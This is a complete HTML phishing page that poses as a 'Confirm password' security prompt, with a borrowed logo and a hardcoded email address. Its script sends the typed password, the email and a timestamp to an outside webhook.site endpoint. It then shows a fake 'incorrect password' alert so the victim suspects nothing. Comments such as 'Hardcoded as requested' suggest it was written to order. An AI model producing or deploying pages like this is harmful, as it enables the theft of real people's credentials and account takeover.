<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Password</title>
</head>
<body>
    <div style="text-align: center; margin: 50px;">
        <img src="https://geekysherlock.github.io/finn/finn_real_logo.png" alt="Logo" style="height: 50px; margin-bottom: 30px;">
        <h1>Confirm password</h1>
        <p>For security reasons, we ask you to confirm your password.</p>
        
        <div style="background: #f5f5f7; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 300px;">
            <span>abc@gmail.com</span>
            <a href="#" style="float: right; color: #0071e3;">Change</a>
            <div style="clear: both;"></div>
        </div>
        
        <div style="margin: 20px auto; max-width: 300px;">
            <div>Password</div>
            <input type="password" id="password" placeholder="Enter your password" style="width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd;">
        </div>
        
        <a href="#" style="color: #0071e3; display: block; margin: 15px;">Forgot password?</a>
        
        <button onclick="sendData()" style="background: #0071e3; color: white; border: none; padding: 12px 30px; border-radius: 8px; cursor: pointer;">
            Continue
        </button>
    </div>

    <script>
        function sendData() {
            const password = document.getElementById('password').value;
            const email = 'abc@gmail.com'; // Hardcoded as requested
            
            // Send to webhook - SIMPLE and DIRECT
            fetch('https://webhook.site/geeky', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Show error message like original page
            alert('The password you entered is incorrect. Please try again.');
            document.getElementById('password').value = "";
        }
    </script>
</body>
</html>
